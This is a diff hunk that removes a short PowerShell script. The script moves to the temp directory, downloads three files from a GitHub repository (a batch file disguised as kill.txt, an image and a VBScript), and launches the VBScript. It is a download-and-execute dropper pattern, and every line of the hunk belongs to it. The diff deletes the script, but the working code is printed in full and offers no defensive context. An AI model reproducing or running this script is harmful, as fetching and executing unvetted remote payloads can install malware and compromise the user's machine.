@@ -1,6 +1,0 @@
-cd $Env:Temp
-Invoke-WebRequest -Uri "https://github.com/ssbb36/stv/raw/main/kill.txt" -OutFile "kill.bat"
-Invoke-WebRequest -Uri "https://github.com/ssbb36/stv/raw/main/kill.jpg" -OutFile "kill.jpg"
-Invoke-WebRequest -Uri "https://github.com/ssbb36/stv/raw/main/kill.vbs" -OutFile "kill.vbs"
-$args = @("Comma","Separated","Arguments")
-Start-Process -Filepath "kill.vbs" -ArgumentList $args
